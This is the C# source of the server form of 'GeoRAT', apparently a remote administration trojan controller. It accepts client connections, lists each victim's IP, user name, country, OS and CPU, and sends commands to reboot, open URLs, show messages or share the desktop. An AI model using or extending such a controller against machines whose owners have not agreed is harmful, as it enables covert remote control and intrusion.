
using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using GeoRAT.Server.CommandHandlers;
using GeoRAT.Server.Net;
using GeoRAT.Server.PacketStruct;
using Microsoft.VisualBasic;


namespace GeoRAT.Server
{
    public partial class Form1 : Form
    {
        private CommandSender Sender;
        private int ClientsConnected;
        public Form1()
        {
            InitializeComponent();
            
        }

        private void xylosButton1_Click(object sender, EventArgs e)
        {
            try
            {

                var IP = xylosTextBox1.Text;
                var PORT = int.Parse(xylosTextBox2.Text);
                NetworkServer ns = new NetworkServer(IP, PORT);
                ns.OnConnected += OnConnectedHandler;
                ns.Start();
            }
            catch 
            {
                MessageBox.Show("Enter valid IP address and port!", "Something went wrong", MessageBoxButtons.OK, MessageBoxIcon.Error); 
            }
        }

        //Handle new connection 
        private void OnConnectedHandler(Socket s)
        {
            DataHandler handle = new DataHandler(s); //We got socket, lets make DataHandler using it, which does all operations on specified socket (reading data)
            handle.OnDisconnected += OnDisconnectedHandler; //Associate datahandler events with handler functions 
            handle.OnReceived += OnDataReceived;

        }

        //Received data from client, lets decompress, deserialize it and then add info to listview 
        private void OnDataReceived(byte[] buffer, Socket received)
        {
            Serializer infoSerializer = new Serializer();
            var decompress = Compressor.Compression.Decompress(buffer);
            var data = infoSerializer.Deserialize(decompress);

            //Invokes Action delegate and begins processing of information we got so far 
            Invoke(new Action(
                () =>
                {
                    var ip = received.RemoteEndPoint.ToString().Split(':');
                    //find flag for our Country 
                    int index = 0;
                    for (int i = 0; i < Flags.Images.Count - 1; i++)
                    {
                        string name = Flags.Images.Keys[i].ToLower();
                        if (name.Contains(data.Country.ToLower()))
                        {
                            index = Flags.Images.IndexOfKey(name);
                        }
                    }

                    //add data to listview including flag 
                    ListViewItem item = new ListViewItem();
                    item.Tag = received;
                    item.Text = ip[0];
                    item.SubItems.Add(data.UserName);
                    item.ImageIndex = index;
                    item.SubItems.Add(data.Country);
                    item.SubItems.Add(data.OS);
                    item.SubItems.Add(data.CPU);
                    lvConnections.Items.Add(item);
                    ClientsConnected++;
                    UpdateOnline();

                }));
        }

        private void UpdateOnline()
        {
        }
        //if client disconnects, remove it from listview 

        private void OnDisconnectedHandler(Socket s)
        {
            Invoke(new Action(
                () =>
                {
                    foreach (ListViewItem i in lvConnections.Items)
                        if ((Socket)i.Tag == s)
                        {
                            i.Remove();
                            --ClientsConnected;
                            UpdateOnline();
                        }
                }));

        }


        
        //-********************************************************-//

            //COMMAND SENDING FUNCTIONS//




            //send Disconnect
        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket)i.Tag, new Commands("Disconnect", "'"));

            }
        }

        //Send Open Website 
        private void openWebsiteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var site = Interaction.InputBox("Enter URL:", "Open Website", "http://");
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket)i.Tag, new Commands("OpenURL", site));
            }
        }

        //Send Reboot 
        private void rebootToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket)i.Tag, new Commands("Restart", "'"));

            }
        }

        //Send Message
        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                var msg = Interaction.InputBox("Enter Message to send", "Messagebox", "Hello");
                Sender = new CommandSender((Socket)i.Tag, new Commands("Message", msg));
            }
        }

        private void desktopSharingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem i in lvConnections.SelectedItems)
            {
                Sender = new CommandSender((Socket) i.Tag, new Commands("Desktop", ""));
                
            }
        }

       
    }
}
